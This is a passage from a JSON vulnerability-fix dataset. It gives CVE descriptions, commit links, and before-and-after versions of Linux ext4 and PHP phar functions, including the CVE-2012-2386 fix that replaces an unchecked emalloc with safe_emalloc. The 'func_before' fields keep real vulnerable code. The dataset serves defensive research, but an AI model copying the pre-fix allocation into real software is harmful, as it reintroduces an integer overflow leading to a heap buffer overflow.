                "\tif (groups_per_flex < 2) {"
            ],
            "added_lines": [
                "\tunsigned int groups_per_flex = 0;",
                "\tif (sbi->s_log_groups_per_flex < 1 || sbi->s_log_groups_per_flex > 31) {",
                "\tgroups_per_flex = 1 << sbi->s_log_groups_per_flex;"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2386",
        "func_name": "php/php-src/phar_tar_process_metadata",
        "description": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/158d8a6b088662ce9d31e0c777c6ebe90efdc854",
        "commit_title": "fix unchecked emalloc",
        "commit_text": "",
        "func_before": "static int phar_tar_process_metadata(phar_entry_info *entry, php_stream *fp TSRMLS_DC) /* {{{ */\n{\n\tchar *metadata;\n\tsize_t save = php_stream_tell(fp), read;\n\tphar_entry_info *mentry;\n\n\tmetadata = (char *) emalloc(entry->uncompressed_filesize + 1);\n\n\tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n\tif (read != entry->uncompressed_filesize) {\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (phar_parse_metadata(&metadata, &entry->metadata, entry->uncompressed_filesize TSRMLS_CC) == FAILURE) {\n\t\t/* if not valid serialized data, it is a regular string */\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (entry->filename_len == sizeof(\".phar/.metadata.bin\")-1 && !memcmp(entry->filename, \".phar/.metadata.bin\", sizeof(\".phar/.metadata.bin\")-1)) {\n\t\tentry->phar->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t} else if (entry->filename_len >= sizeof(\".phar/.metadata/\") + sizeof(\"/.metadata.bin\") - 1 && SUCCESS == zend_hash_find(&(entry->phar->manifest), entry->filename + sizeof(\".phar/.metadata/\") - 1, entry->filename_len - (sizeof(\"/.metadata.bin\") - 1 + sizeof(\".phar/.metadata/\") - 1), (void *)&mentry)) {\n\t\t/* transfer this metadata to the entry it refers */\n\t\tmentry->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t}\n\n\tefree(metadata);\n\tphp_stream_seek(fp, save, SEEK_SET);\n\treturn SUCCESS;\n}",
        "func": "static int phar_tar_process_metadata(phar_entry_info *entry, php_stream *fp TSRMLS_DC) /* {{{ */\n{\n\tchar *metadata;\n\tsize_t save = php_stream_tell(fp), read;\n\tphar_entry_info *mentry;\n\n\tmetadata = (char *) safe_emalloc(1, entry->uncompressed_filesize, 1);\n\n\tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n\tif (read != entry->uncompressed_filesize) {\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (phar_parse_metadata(&metadata, &entry->metadata, entry->uncompressed_filesize TSRMLS_CC) == FAILURE) {\n\t\t/* if not valid serialized data, it is a regular string */\n\t\tefree(metadata);\n\t\tphp_stream_seek(fp, save, SEEK_SET);\n\t\treturn FAILURE;\n\t}\n\n\tif (entry->filename_len == sizeof(\".phar/.metadata.bin\")-1 && !memcmp(entry->filename, \".phar/.metadata.bin\", sizeof(\".phar/.metadata.bin\")-1)) {\n\t\tentry->phar->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t} else if (entry->filename_len >= sizeof(\".phar/.metadata/\") + sizeof(\"/.metadata.bin\") - 1 && SUCCESS == zend_hash_find(&(entry->phar->manifest), entry->filename + sizeof(\".phar/.metadata/\") - 1, entry->filename_len - (sizeof(\"/.metadata.bin\") - 1 + sizeof(\".phar/.metadata/\") - 1), (void *)&mentry)) {\n\t\t/* transfer this metadata to the entry it refers */\n\t\tmentry->metadata = entry->metadata;\n\t\tentry->metadata = NULL;\n\t}\n\n\tefree(metadata);\n\tphp_stream_seek(fp, save, SEEK_SET);\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,7 +4,7 @@\n \tsize_t save = php_stream_tell(fp), read;\n \tphar_entry_info *mentry;\n \n-\tmetadata = (char *) emalloc(entry->uncompressed_filesize + 1);\n+\tmetadata = (char *) safe_emalloc(1, entry->uncompressed_filesize, 1);\n \n \tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n \tif (read != entry->uncompressed_filesize) {",
        "diff_line_info": {
            "deleted_lines": [
                "\tmetadata = (char *) emalloc(entry->uncompressed_filesize + 1);"
            ],
            "added_lines": [
                "\tmetadata = (char *) safe_emalloc(1, entry->uncompressed_filesize, 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2386",
        "func_name": "php/php-src/phar_parse_tarfile",
        "description": "Integer overflow in the phar_parse_tarfile function in tar.c in the phar extension in PHP before 5.3.14 and 5.4.x before 5.4.4 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted tar file that triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/158d8a6b088662ce9d31e0c777c6ebe90efdc854",
        "commit_title": "fix unchecked emalloc",
        "commit_text": "",
        "func_before": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned char*)(buffer))[0]))\n#else\n# define PHAR_GET_32(buffer) (php_uint32) *(buffer)\n#endif\n\t\t\tmyphar->sig_flags = PHAR_GET_32(buf);\n\t\t\tif (FAILURE == phar_verify_signature(fp, php_stream_tell(fp) - size - 512, myphar->sig_flags, buf + 8, size - 8, fname, &myphar->signature, &myphar->sig_len, error TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save = *error;\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be verified: %s\", fname, save);\n\t\t\t\t\tefree(save);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n\t\t\tphp_stream_seek(fp, curloc + 512, SEEK_SET);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\t\tphp_stream_seek(fp, 512, SEEK_CUR);\n\t\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\thdr = (tar_header*) buf;\n\t\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\n\t\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" has entries after signature, invalid phar\", fname);\n\t\t\t}\n\n\t\t\tgoto bail;\n\t\t}\n\n\t\tif (!last_was_longlink && hdr->typeflag == 'L') {\n\t\t\tlast_was_longlink = 1;\n\t\t\t/* support the ././@LongLink system for storing long filenames */\n\t\t\tentry.filename_len = entry.uncompressed_filesize;\n\n\t\t\t/* Check for overflow - bug 61065 */\n\t\t\tif (entry.filename_len == UINT_MAX) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n\n\t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);\n\t\t\tif (read != entry.filename_len) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\t\t/* skip blank stuff */\n\t\t\tsize = ((size+511)&~511) - size;\n\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\t\n\t\t\tif (read != sizeof(buf)) {\n\t\t\t\tefree(entry.filename);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcontinue;\n\t\t} else if (!last_was_longlink && !old && hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "func": "int phar_parse_tarfile(php_stream* fp, char *fname, int fname_len, char *alias, int alias_len, phar_archive_data** pphar, int is_data, php_uint32 compression, char **error TSRMLS_DC) /* {{{ */\n{\n\tchar buf[512], *actual_alias = NULL, *p;\n\tphar_entry_info entry = {0};\n\tsize_t pos = 0, read, totalsize;\n\ttar_header *hdr;\n\tphp_uint32 sum1, sum2, size, old;\n\tphar_archive_data *myphar, **actual;\n\tint last_was_longlink = 0;\n\n\tif (error) {\n\t\t*error = NULL;\n\t}\n\n\tphp_stream_seek(fp, 0, SEEK_END);\n\ttotalsize = php_stream_tell(fp);\n\tphp_stream_seek(fp, 0, SEEK_SET);\n\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\tif (read != sizeof(buf)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is not a tar file or is truncated\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\treturn FAILURE;\n\t}\n\n\thdr = (tar_header*)buf;\n\told = (memcmp(hdr->magic, \"ustar\", sizeof(\"ustar\")-1) != 0);\n\n\tmyphar = (phar_archive_data *) pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\tmyphar->is_persistent = PHAR_G(persist);\n\t/* estimate number of entries, can't be certain with tar files */\n\tzend_hash_init(&myphar->manifest, 2 + (totalsize >> 12),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tzend_hash_init(&myphar->virtual_dirs, 4 + (totalsize >> 11),\n\t\tzend_get_hash_value, NULL, (zend_bool)myphar->is_persistent);\n\tmyphar->is_tar = 1;\n\t/* remember whether this entire phar was compressed with gz/bzip2 */\n\tmyphar->flags = compression;\n\n\tentry.is_tar = 1;\n\tentry.is_crc_checked = 1;\n\tentry.phar = myphar;\n\tpos += sizeof(buf);\n\n\tdo {\n\t\tphar_entry_info *newentry;\n\n\t\tpos = php_stream_tell(fp);\n\t\thdr = (tar_header*) buf;\n\t\tsum1 = phar_tar_number(hdr->checksum, sizeof(hdr->checksum));\n\t\tif (sum1 == 0 && phar_tar_checksum(buf, sizeof(buf)) == 0) {\n\t\t\tbreak;\n\t\t}\n\t\tmemset(hdr->checksum, ' ', sizeof(hdr->checksum));\n\t\tsum2 = phar_tar_checksum(buf, old?sizeof(old_tar_header):sizeof(tar_header));\n\n\t\tsize = entry.uncompressed_filesize = entry.compressed_filesize =\n\t\t\tphar_tar_number(hdr->size, sizeof(hdr->size));\n\n\t\tif (((!old && hdr->prefix[0] == 0) || old) && strlen(hdr->name) == sizeof(\".phar/signature.bin\")-1 && !strncmp(hdr->name, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\toff_t curloc;\n\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has signature that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\nbail:\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tcurloc = php_stream_tell(fp);\n\t\t\tread = php_stream_read(fp, buf, size);\n\t\t\tif (read != size) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" signature cannot be read\", fname);\n\t\t\t\t}\n\t\t\t\tgoto bail;\n\t\t\t}\n#ifdef WORDS_BIGENDIAN\n# define PHAR_GET_32(buffer) \\\n\t(((((unsigned char*)(buffer))[3]) << 24) \\\n\t\t| ((((unsigned char*)(buffer))[2]) << 16) \\\n\t\t| ((((unsigned char*)(buffer))[1]) <<  8) \\\n\t\t| (((unsigned 